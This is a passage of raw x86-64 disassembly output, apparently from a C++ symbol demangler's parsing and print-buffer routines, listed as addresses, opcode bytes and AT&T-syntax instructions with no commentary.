   2dc4941e1:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc4941e5:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   2dc4941e8:	75 3e                	jne    0x2dc494228
   2dc4941ea:	48 83 c2 01          	add    $0x1,%rdx
   2dc4941ee:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc4941f2:	8b 53 28             	mov    0x28(%rbx),%edx
   2dc4941f5:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   2dc4941f8:	7d 2e                	jge    0x2dc494228
   2dc4941fa:	48 63 c2             	movslq %edx,%rax
   2dc4941fd:	83 c2 01             	add    $0x1,%edx
   2dc494200:	48 c1 e0 05          	shl    $0x5,%rax
   2dc494204:	48 03 43 20          	add    0x20(%rbx),%rax
   2dc494208:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   2dc49420f:	00 
   2dc494210:	89 53 28             	mov    %edx,0x28(%rbx)
   2dc494213:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   2dc494219:	89 48 10             	mov    %ecx,0x10(%rax)
   2dc49421c:	48 83 c4 20          	add    $0x20,%rsp
   2dc494220:	5b                   	pop    %rbx
   2dc494221:	c3                   	ret
   2dc494222:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494228:	31 c0                	xor    %eax,%eax
   2dc49422a:	48 83 c4 20          	add    $0x20,%rsp
   2dc49422e:	5b                   	pop    %rbx
   2dc49422f:	c3                   	ret
   2dc494230:	31 c9                	xor    %ecx,%ecx
   2dc494232:	eb b6                	jmp    0x2dc4941ea
   2dc494234:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc49423b:	00 00 00 00 
   2dc49423f:	90                   	nop
   2dc494240:	55                   	push   %rbp
   2dc494241:	57                   	push   %rdi
   2dc494242:	56                   	push   %rsi
   2dc494243:	53                   	push   %rbx
   2dc494244:	48 83 ec 48          	sub    $0x48,%rsp
   2dc494248:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   2dc49424d:	41 89 d0             	mov    %edx,%r8d
   2dc494250:	48 89 ce             	mov    %rcx,%rsi
   2dc494253:	48 8d 15 96 43 02 00 	lea    0x24396(%rip),%rdx        # 0x2dc4b85f0
   2dc49425a:	48 89 d9             	mov    %rbx,%rcx
   2dc49425d:	e8 8e 07 01 00       	call   0x2dc4a49f0
   2dc494262:	48 89 d9             	mov    %rbx,%rcx
   2dc494265:	e8 76 0a 01 00       	call   0x2dc4a4ce0
   2dc49426a:	48 85 c0             	test   %rax,%rax
   2dc49426d:	74 71                	je     0x2dc4942e0
   2dc49426f:	48 8b 96 00 01 00 00 	mov    0x100(%rsi),%rdx
   2dc494276:	48 8d 2c 03          	lea    (%rbx,%rax,1),%rbp
   2dc49427a:	eb 26                	jmp    0x2dc4942a2
   2dc49427c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc494280:	48 89 d1             	mov    %rdx,%rcx
   2dc494283:	48 83 c2 01          	add    $0x1,%rdx
   2dc494287:	48 83 c3 01          	add    $0x1,%rbx
   2dc49428b:	48 89 96 00 01 00 00 	mov    %rdx,0x100(%rsi)
   2dc494292:	40 88 3c 0e          	mov    %dil,(%rsi,%rcx,1)
   2dc494296:	40 88 be 08 01 00 00 	mov    %dil,0x108(%rsi)
   2dc49429d:	48 39 eb             	cmp    %rbp,%rbx
   2dc4942a0:	74 3e                	je     0x2dc4942e0
   2dc4942a2:	0f b6 3b             	movzbl (%rbx),%edi
   2dc4942a5:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   2dc4942ac:	75 d2                	jne    0x2dc494280
   2dc4942ae:	ba ff 00 00 00       	mov    $0xff,%edx
   2dc4942b3:	48 89 f1             	mov    %rsi,%rcx
   2dc4942b6:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%rsi)
   2dc4942bd:	4c 8b 86 18 01 00 00 	mov    0x118(%rsi),%r8
   2dc4942c4:	ff 96 10 01 00 00    	call   *0x110(%rsi)
   2dc4942ca:	83 86 40 01 00 00 01 	addl   $0x1,0x140(%rsi)
   2dc4942d1:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc4942d6:	31 c9                	xor    %ecx,%ecx
   2dc4942d8:	eb ad                	jmp    0x2dc494287
   2dc4942da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc4942e0:	48 83 c4 48          	add    $0x48,%rsp
   2dc4942e4:	5b                   	pop    %rbx
   2dc4942e5:	5e                   	pop    %rsi
   2dc4942e6:	5f                   	pop    %rdi
   2dc4942e7:	5d                   	pop    %rbp
   2dc4942e8:	c3                   	ret
   2dc4942e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4942f0:	41 54                	push   %r12
   2dc4942f2:	55                   	push   %rbp
   2dc4942f3:	57                   	push   %rdi
   2dc4942f4:	56                   	push   %rsi
   2dc4942f5:	53                   	push   %rbx
   2dc4942f6:	48 83 ec 40          	sub    $0x40,%rsp
   2dc4942fa:	48 89 cb             	mov    %rcx,%rbx
   2dc4942fd:	44 89 c5             	mov    %r8d,%ebp
   2dc494300:	83 fa 59             	cmp    $0x59,%edx
   2dc494303:	0f 84 47 01 00 00    	je     0x2dc494450
   2dc494309:	83 fa 5a             	cmp    $0x5a,%edx
   2dc49430c:	0f 84 ae 00 00 00    	je     0x2dc4943c0
   2dc494312:	83 fa 58             	cmp    $0x58,%edx
   2dc494315:	0f 84 4d 01 00 00    	je     0x2dc494468
   2dc49431b:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   2dc494322:	00 00 00 
   2dc494325:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   2dc49432a:	41 89 e8             	mov    %ebp,%r8d
   2dc49432d:	48 8d 15 bc 42 02 00 	lea    0x242bc(%rip),%rdx        # 0x2dc4b85f0
   2dc494334:	48 89 f1             	mov    %rsi,%rcx
   2dc494337:	e8 b4 06 01 00       	call   0x2dc4a49f0
   2dc49433c:	48 89 f1             	mov    %rsi,%rcx
   2dc49433f:	e8 9c 09 01 00       	call   0x2dc4a4ce0
   2dc494344:	48 85 c0             	test   %rax,%rax
   2dc494347:	0f 84 f3 00 00 00    	je     0x2dc494440
   2dc49434d:	48 8b 93 00 01 00 00 	mov    0x100(%rbx),%rdx
   2dc494354:	48 8d 2c 06          	lea    (%rsi,%rax,1),%rbp
   2dc494358:	eb 2c                	jmp    0x2dc494386
   2dc49435a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494360:	48 89 d1             	mov    %rdx,%rcx
   2dc494363:	48 83 c2 01          	add    $0x1,%rdx
   2dc494367:	48 83 c6 01          	add    $0x1,%rsi
   2dc49436b:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   2dc494372:	40 88 3c 0b          	mov    %dil,(%rbx,%rcx,1)
   2dc494376:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   2dc49437d:	48 39 f5             	cmp    %rsi,%rbp
   2dc494380:	0f 84 ba 00 00 00    	je     0x2dc494440
   2dc494386:	0f b6 3e             	movzbl (%rsi),%edi
   2dc494389:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   2dc494390:	75 ce                	jne    0x2dc494360
   2dc494392:	ba ff 00 00 00       	mov    $0xff,%edx
   2dc494397:	48 89 d9             	mov    %rbx,%rcx
   2dc49439a:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   2dc4943a1:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   2dc4943a8:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   2dc4943ae:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   2dc4943b5:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc4943ba:	31 c9                	xor    %ecx,%ecx
   2dc4943bc:	eb a9                	jmp    0x2dc494367
   2dc4943be:	66 90                	xchg   %ax,%ax
   2dc4943c0:	41 bc 03 00 00 00    	mov    $0x3,%r12d
   2dc4943c6:	48 8d 35 26 42 02 00 	lea    0x24226(%rip),%rsi        # 0x2dc4b85f3
   2dc4943cd:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   2dc4943d4:	49 01 f4             	add    %rsi,%r12
   2dc4943d7:	eb 2d                	jmp    0x2dc494406
   2dc4943d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4943e0:	48 89 c2             	mov    %rax,%rdx
   2dc4943e3:	48 83 c0 01          	add    $0x1,%rax
   2dc4943e7:	48 83 c6 01          	add    $0x1,%rsi
   2dc4943eb:	48 89 83 00 01 00 00 	mov    %rax,0x100(%rbx)
   2dc4943f2:	40 88 3c 13          	mov    %dil,(%rbx,%rdx,1)
   2dc4943f6:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   2dc4943fd:	4c 39 e6             	cmp    %r12,%rsi
   2dc494400:	0f 84 1f ff ff ff    	je     0x2dc494325
   2dc494406:	0f b6 3e             	movzbl (%rsi),%edi
   2dc494409:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   2dc49440f:	75 cf                	jne    0x2dc4943e0
   2dc494411:	ba ff 00 00 00       	mov    $0xff,%edx
   2dc494416:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   2dc49441d:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   2dc494424:	48 89 d9             	mov    %rbx,%rcx
   2dc494427:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   2dc49442d:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   2dc494434:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc494439:	31 d2                	xor    %edx,%edx
   2dc49443b:	eb aa                	jmp    0x2dc4943e7
   2dc49443d:	0f 1f 00             	nopl   (%rax)
   2dc494440:	48 83 c4 40          	add    $0x40,%rsp
   2dc494444:	5b                   	pop    %rbx
   2dc494445:	5e                   	pop    %rsi
   2dc494446:	5f                   	pop    %rdi
   2dc494447:	5d                   	pop    %rbp
   2dc494448:	41 5c                	pop    %r12
   2dc49444a:	c3                   	ret
   2dc49444b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc494450:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   2dc494456:	48 8d 35 9d 41 02 00 	lea    0x2419d(%rip),%rsi        # 0x2dc4b85fa
   2dc49445d:	e9 6b ff ff ff       	jmp    0x2dc4943cd
   2dc494462:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494468:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   2dc49446e:	48 8d 35 82 41 02 00 	lea    0x24182(%rip),%rsi        # 0x2dc4b85f7
   2dc494475:	e9 53 ff ff ff       	jmp    0x2dc4943cd
   2dc49447a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494480:	53                   	push   %rbx
   2dc494481:	48 83 ec 20          	sub    $0x20,%rsp
   2dc494485:	48 89 cb             	mov    %rcx,%rbx
   2dc494488:	e8 73 f5 ff ff       	call   0x2dc493a00
   2dc49448d:	41 89 c0             	mov    %eax,%r8d
   2dc494490:	31 c0                	xor    %eax,%eax
   2dc494492:	45 85 c0             	test   %r8d,%r8d
   2dc494495:	7e 6d                	jle    0x2dc494504
   2dc494497:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc49449b:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   2dc49449f:	49 63 c0             	movslq %r8d,%rax
   2dc4944a2:	48 29 d1             	sub    %rdx,%rcx
   2dc4944a5:	48 39 c1             	cmp    %rax,%rcx
   2dc4944a8:	7c 76                	jl     0x2dc494520
   2dc4944aa:	48 01 d0             	add    %rdx,%rax
   2dc4944ad:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc4944b1:	f6 43 10 04          	testb  $0x4,0x10(%rbx)
   2dc4944b5:	74 05                	je     0x2dc4944bc
   2dc4944b7:	80 38 24             	cmpb   $0x24,(%rax)
   2dc4944ba:	74 54                	je     0x2dc494510
   2dc4944bc:	41 83 f8 09          	cmp    $0x9,%r8d
   2dc4944c0:	7e 36                	jle    0x2dc4944f8
   2dc4944c2:	48 b8 5f 47 4c 4f 42 	movabs $0x5f4c41424f4c475f,%rax
   2dc4944c9:	41 4c 5f 
   2dc4944cc:	48 39 02             	cmp    %rax,(%rdx)
   2dc4944cf:	75 27                	jne    0x2dc4944f8
   2dc4944d1:	0f b6 42 08          	movzbl 0x8(%rdx),%eax
   2dc4944d5:	83 e8 24             	sub    $0x24,%eax
   2dc4944d8:	3c 3b                	cmp    $0x3b,%al
   2dc4944da:	77 1c                	ja     0x2dc4944f8
   2dc4944dc:	48 b9 01 04 00 00 00 	movabs $0x800000000000401,%rcx
   2dc4944e3:	00 00 08 
   2dc4944e6:	48 0f a3 c1          	bt     %rax,%rcx
   2dc4944ea:	73 0c                	jae    0x2dc4944f8
   2dc4944ec:	80 7a 09 4e          	cmpb   $0x4e,0x9(%rdx)
   2dc4944f0:	74 36                	je     0x2dc494528
   2dc4944f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc4944f8:	48 89 d9             	mov    %rbx,%rcx
   2dc4944fb:	e8 a0 f4 ff ff       	call   0x2dc4939a0
   2dc494500:	48 89 43 40          	mov    %rax,0x40(%rbx)
   2dc494504:	48 83 c4 20          	add    $0x20,%rsp
   2dc494508:	5b                   	pop    %rbx
   2dc494509:	c3                   	ret
   2dc49450a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494510:	48 83 c0 01          	add    $0x1,%rax
   2dc494514:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc494518:	41 83 f8 09          	cmp    $0x9,%r8d
   2dc49451c:	7f a4                	jg     0x2dc4944c2
   2dc49451e:	eb d8                	jmp    0x2dc4944f8
   2dc494520:	31 c0                	xor    %eax,%eax
   2dc494522:	eb dc                	jmp    0x2dc494500
   2dc494524:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc494528:	8b 43 48             	mov    0x48(%rbx),%eax
   2dc49452b:	8b 53 28             	mov    0x28(%rbx),%edx
   2dc49452e:	83 c0 16             	add    $0x16,%eax
   2dc494531:	44 29 c0             	sub    %r8d,%eax
   2dc494534:	89 43 48             	mov    %eax,0x48(%rbx)
   2dc494537:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   2dc49453a:	7d e4                	jge    0x2dc494520
   2dc49453c:	48 63 c2             	movslq %edx,%rax
   2dc49453f:	83 c2 01             	add    $0x1,%edx
   2dc494542:	89 53 28             	mov    %edx,0x28(%rbx)
   2dc494545:	48 c1 e0 05          	shl    $0x5,%rax
   2dc494549:	48 8d 15 ad 40 02 00 	lea    0x240ad(%rip),%rdx        # 0x2dc4b85fd
   2dc494550:	48 03 43 20          	add    0x20(%rbx),%rax
   2dc494554:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   2dc49455b:	00 
   2dc49455c:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   2dc494562:	48 89 50 10          	mov    %rdx,0x10(%rax)
   2dc494566:	c7 40 18 15 00 00 00 	movl   $0x15,0x18(%rax)
   2dc49456d:	eb 91                	jmp    0x2dc494500
   2dc49456f:	90                   	nop
   2dc494570:	57                   	push   %rdi
   2dc494571:	56                   	push   %rsi
   2dc494572:	53                   	push   %rbx
   2dc494573:	48 83 ec 20          	sub    $0x20,%rsp
   2dc494577:	48 89 cb             	mov    %rcx,%rbx
   2dc49457a:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   2dc49457e:	80 39 53             	cmpb   $0x53,(%rcx)
   2dc494581:	75 76                	jne    0x2dc4945f9
   2dc494583:	48 8d 41 01          	lea    0x1(%rcx),%rax
   2dc494587:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc49458b:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   2dc49458f:	84 c0                	test   %al,%al
   2dc494591:	74 7d                	je     0x2dc494610
   2dc494593:	48 8d 41 02          	lea    0x2(%rcx),%rax
   2dc494597:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc49459b:	0f be 41 01          	movsbl 0x1(%rcx),%eax
   2dc49459f:	8d 48 d0             	lea    -0x30(%rax),%ecx
   2dc4945a2:	80 f9 2f             	cmp    $0x2f,%cl
   2dc4945a5:	77 69                	ja     0x2dc494610
   2dc4945a7:	49 b8 ff 03 fe ff ff 	movabs $0x87fffffe03ff,%r8
   2dc4945ae:	87 00 00 
   2dc4945b1:	49 0f a3 c8          	bt     %rcx,%r8
   2dc4945b5:	73 59                	jae    0x2dc494610
   2dc4945b7:	31 d2                	xor    %edx,%edx
   2dc4945b9:	3c 5f                	cmp    $0x5f,%al
   2dc4945bb:	75 20                	jne    0x2dc4945dd
   2dc4945bd:	e9 ae 00 00 00       	jmp    0x2dc494670
   2dc4945c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc4945c8:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc4945cc:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc4945d0:	0f be 00             	movsbl (%rax),%eax
   2dc4945d3:	3c 5f                	cmp    $0x5f,%al
   2dc4945d5:	0f 84 b5 01 00 00    	je     0x2dc494790
   2dc4945db:	89 ca                	mov    %ecx,%edx
   2dc4945dd:	8d 48 d0             	lea    -0x30(%rax),%ecx
   2dc4945e0:	80 f9 09             	cmp    $0x9,%cl
   2dc4945e3:	77 6b                	ja     0x2dc494650
   2dc4945e5:	8d 0c d2             	lea    (%rdx,%rdx,8),%ecx
   2dc4945e8:	8d 4c 88 d0          	lea    -0x30(%rax,%rcx,4),%ecx
   2dc4945ec:	39 d1                	cmp    %edx,%ecx
   2dc4945ee:	72 09                	jb     0x2dc4945f9
   2dc4945f0:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc4945f4:	80 38 00             	cmpb   $0x0,(%rax)
   2dc4945f7:	75 cf                	jne    0x2dc4945c8
   2dc4945f9:	31 f6                	xor    %esi,%esi
   2dc4945fb:	48 89 f0             	mov    %rsi,%rax
   2dc4945fe:	48 83 c4 20          	add    $0x20,%rsp
   2dc494602:	5b                   	pop    %rbx
   2dc494603:	5e                   	pop    %rsi
   2dc494604:	5f                   	pop    %rdi
   2dc494605:	c3                   	ret
   2dc494606:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc49460d:	00 00 00 
   2dc494610:	8b 4b 10             	mov    0x10(%rbx),%ecx
   2dc494613:	83 e1 08             	and    $0x8,%ecx
   2dc494616:	75 50                	jne    0x2dc494668
   2dc494618:	83 e2 01             	and    $0x1,%edx
   2dc49461b:	74 4b                	je     0x2dc494668
   2dc49461d:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc494621:	0f b6 12             	movzbl (%rdx),%edx
   2dc494624:	83 ea 43             	sub    $0x43,%edx
   2dc494627:	80 fa 01             	cmp    $0x1,%dl
   2dc49462a:	41 0f 96 c0          	setbe  %r8b
   2dc49462e:	48 8d 15 eb 49 02 00 	lea    0x249eb(%rip),%rdx        # 0x2dc4b9020
   2dc494635:	48 8d 8a 88 01 00 00 	lea    0x188(%rdx),%rcx
   2dc49463c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc494640:	38 02                	cmp    %al,(%rdx)
   2dc494642:	74 4c                	je     0x2dc494690
   2dc494644:	48 83 c2 38          	add    $0x38,%rdx
   2dc494648:	48 39 ca             	cmp    %rcx,%rdx
   2dc49464b:	75 f3                	jne    0x2dc494640
   2dc49464d:	eb aa                	jmp    0x2dc4945f9
   2dc49464f:	90                   	nop
   2dc494650:	8d 48 bf             	lea    -0x41(%rax),%ecx
   2dc494653:	80 f9 19             	cmp    $0x19,%cl
   2dc494656:	77 a1                	ja     0x2dc4945f9
   2dc494658:	8d 0c d2             	lea    (%rdx,%rdx,8),%ecx
   2dc49465b:	8d 4c 88 c9          	lea    -0x37(%rax,%rcx,4),%ecx
   2dc49465f:	eb 8b                	jmp    0x2dc4945ec
   2dc494661:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc494668:	85 c9                	test   %ecx,%ecx
   2dc49466a:	41 0f 95 c0          	setne  %r8b
   2dc49466e:	eb be                	jmp    0x2dc49462e
   2dc494670:	31 c9                	xor    %ecx,%ecx
   2dc494672:	3b 4b 38             	cmp    0x38(%rbx),%ecx
   2dc494675:	73 82                	jae    0x2dc4945f9
   2dc494677:	48 8b 43 30          	mov    0x30(%rbx),%rax
   2dc49467b:	48 8b 34 c8          	mov    (%rax,%rcx,8),%rsi
   2dc49467f:	48 89 f0             	mov    %rsi,%rax
   2dc494682:	48 83 c4 20          	add    $0x20,%rsp
   2dc494686:	5b                   	pop    %rbx
   2dc494687:	5e                   	pop    %rsi
   2dc494688:	5f                   	pop    %rdi
   2dc494689:	c3                   	ret
   2dc49468a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494690:	4c 8b 52 28          	mov    0x28(%rdx),%r10
   2dc494694:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494697:	44 8b 4b 2c          	mov    0x2c(%rbx),%r9d
   2dc49469b:	4d 85 d2             	test   %r10,%r10
   2dc49469e:	74 38                	je     0x2dc4946d8
   2dc4946a0:	44 8b 5a 30          	mov    0x30(%rdx),%r11d
   2dc4946a4:	41 39 c1             	cmp    %eax,%r9d
   2dc4946a7:	0f 8e ff 00 00 00    	jle    0x2dc4947ac
   2dc4946ad:	48 63 c8             	movslq %eax,%rcx
   2dc4946b0:	83 c0 01             	add    $0x1,%eax
   2dc4946b3:	48 c1 e1 05          	shl    $0x5,%rcx
   2dc4946b7:	48 03 4b 20          	add    0x20(%rbx),%rcx
   2dc4946bb:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   2dc4946c2:	00 
   2dc4946c3:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc4946c6:	c7 01 18 00 00 00    	movl   $0x18,(%rcx)
   2dc4946cc:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   2dc4946d0:	44 89 59 18          	mov    %r11d,0x18(%rcx)
   2dc4946d4:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   2dc4946d8:	45 84 c0             	test   %r8b,%r8b
   2dc4946db:	0f 85 bf 00 00 00    	jne    0x2dc4947a0
   2dc4946e1:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   2dc4946e5:	8b 52 10             	mov    0x10(%rdx),%edx
   2dc4946e8:	01 53 48             	add    %edx,0x48(%rbx)
   2dc4946eb:	41 39 c1             	cmp    %eax,%r9d
   2dc4946ee:	0f 8e bf 00 00 00    	jle    0x2dc4947b3
   2dc4946f4:	48 63 f0             	movslq %eax,%rsi
   2dc4946f7:	83 c0 01             	add    $0x1,%eax
   2dc4946fa:	48 c1 e6 05          	shl    $0x5,%rsi
   2dc4946fe:	48 03 73 20          	add    0x20(%rbx),%rsi
   2dc494702:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   2dc494709:	00 
   2dc49470a:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc49470d:	c7 06 18 00 00 00    	movl   $0x18,(%rsi)
   2dc494713:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   2dc494717:	89 56 18             	mov    %edx,0x18(%rsi)
   2dc49471a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc49471e:	80 38 42             	cmpb   $0x42,(%rax)
   2dc494721:	0f 85 d4 fe ff ff    	jne    0x2dc4945fb
   2dc494727:	48 8b 7b 40          	mov    0x40(%rbx),%rdi
   2dc49472b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc494730:	48 83 c0 01          	add    $0x1,%rax
   2dc494734:	48 89 d9             	mov    %rbx,%rcx
   2dc494737:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc49473b:	e8 40 fd ff ff       	call   0x2dc494480
   2dc494740:	49 89 f0             	mov    %rsi,%r8
   2dc494743:	ba 4d 00 00 00       	mov    $0x4d,%edx
   2dc494748:	48 89 d9             	mov    %rbx,%rcx
   2dc49474b:	49 89 c1             	mov    %rax,%r9
   2dc49474e:	e8 3d f1 ff ff       	call   0x2dc493890
   2dc494753:	48 89 c6             	mov    %rax,%rsi
   2dc494756:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc49475a:	80 38 42             	cmpb   $0x42,(%rax)
   2dc49475d:	74 d1                	je     0x2dc494730
   2dc49475f:	48 89 7b 40          	mov    %rdi,0x40(%rbx)
   2dc494763:	48 85 f6             	test   %rsi,%rsi
   2dc494766:	0f 84 8d fe ff ff    	je     0x2dc4945f9
   2dc49476c:	8b 43 38             	mov    0x38(%rbx),%eax
   2dc49476f:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   2dc494772:	0f 8d 81 fe ff ff    	jge    0x2dc4945f9
   2dc494778:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   2dc49477c:	48 63 c8             	movslq %eax,%rcx
   2dc49477f:	83 c0 01             	add    $0x1,%eax
   2dc494782:	48 89 34 ca          	mov    %rsi,(%rdx,%rcx,8)
   2dc494786:	89 43 38             	mov    %eax,0x38(%rbx)
   2dc494789:	e9 6d fe ff ff       	jmp    0x2dc4945fb
   2dc49478e:	66 90                	xchg   %ax,%ax
   2dc494790:	83 c1 01             	add    $0x1,%ecx
   2dc494793:	e9 da fe ff ff       	jmp    0x2dc494672
   2dc494798:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc49479f:	00 
   2dc4947a0:	48 8b 4a 18          	mov    0x18(%rdx),%rcx
   2dc4947a4:	8b 52 20             	mov    0x20(%rdx),%edx
   2dc4947a7:	e9 3c ff ff ff       	jmp    0x2dc4946e8
   2dc4947ac:	31 c9                	xor    %ecx,%ecx
   2dc4947ae:	e9 21 ff ff ff       	jmp    0x2dc4946d4
   2dc4947b3:	31 f6                	xor    %esi,%esi
   2dc4947b5:	e9 60 ff ff ff       	jmp    0x2dc49471a
   2dc4947ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc4947c0:	57                   	push   %rdi
   2dc4947c1:	56                   	push   %rsi
   2dc4947c2:	53                   	push   %rbx
   2dc4947c3:	48 83 ec 20          	sub    $0x20,%rsp
   2dc4947c7:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc4947cb:	80 38 57             	cmpb   $0x57,(%rax)
   2dc4947ce:	48 89 cb             	mov    %rcx,%rbx
   2dc4947d1:	48 89 d6             	mov    %rdx,%rsi
   2dc4947d4:	74 24                	je     0x2dc4947fa
   2dc4947d6:	eb 78                	jmp    0x2dc494850
   2dc4947d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc4947df:	00 
   2dc4947e0:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   2dc4947e4:	4c 63 c2             	movslq %edx,%r8
   2dc4947e7:	83 c2 01             	add    $0x1,%edx
   2dc4947ea:	4a 89 04 c1          	mov    %rax,(%rcx,%r8,8)
   2dc4947ee:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc4947f2:	89 53 38             	mov    %edx,0x38(%rbx)
   2dc4947f5:	80 38 57             	cmpb   $0x57,(%rax)
   2dc4947f8:	75 56                	jne    0x2dc494850
   2dc4947fa:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc4947fe:	bf 53 00 00 00       	mov    $0x53,%edi
   2dc494803:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc494807:	80 78 01 50          	cmpb   $0x50,0x1(%rax)
   2dc49480b:	75 0d                	jne    0x2dc49481a
   2dc49480d:	48 83 c0 02          	add    $0x2,%rax
   2dc494811:	bf 54 00 00 00       	mov    $0x54,%edi
   2dc494816:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc49481a:	48 89 d9             	mov    %rbx,%rcx
   2dc49481d:	e8 5e fc ff ff       	call   0x2dc494480
   2dc494822:	4c 8b 06             	mov    (%rsi),%r8
   2dc494825:	89 fa                	mov    %edi,%edx
   2dc494827:	48 89 d9             	mov    %rbx,%rcx
   2dc49482a:	49 89 c1             	mov    %rax,%r9
   2dc49482d:	e8 5e f0 ff ff       	call   0x2dc493890
   2dc494832:	48 89 06             	mov    %rax,(%rsi)
   2dc494835:	48 85 c0             	test   %rax,%rax
   2dc494838:	74 08                	je     0x2dc494842
   2dc49483a:	8b 53 38             	mov    0x38(%rbx),%edx
   2dc49483d:	3b 53 3c             	cmp    0x3c(%rbx),%edx
   2dc494840:	7c 9e                	jl     0x2dc4947e0
   2dc494842:	31 c0                	xor    %eax,%eax
   2dc494844:	48 83 c4 20          	add    $0x20,%rsp
   2dc494848:	5b                   	pop    %rbx
   2dc494849:	5e                   	pop    %rsi
   2dc49484a:	5f                   	pop    %rdi
   2dc49484b:	c3                   	ret
   2dc49484c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc494850:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc494855:	48 83 c4 20          	add    $0x20,%rsp
   2dc494859:	5b                   	pop    %rbx
   2dc49485a:	5e                   	pop    %rsi
   2dc49485b:	5f                   	pop    %rdi
   2dc49485c:	c3                   	ret
   2dc49485d:	0f 1f 00             	nopl   (%rax)
   2dc494860:	41 55                	push   %r13
   2dc494862:	41 54                	push   %r12
   2dc494864:	55                   	push   %rbp
   2dc494865:	57                   	push   %rdi
   2dc494866:	56                   	push   %rsi
   2dc494867:	53                   	push   %rbx
   2dc494868:	48 83 ec 48          	sub    $0x48,%rsp
   2dc49486c:	4c 8b 41 18          	mov    0x18(%rcx),%r8
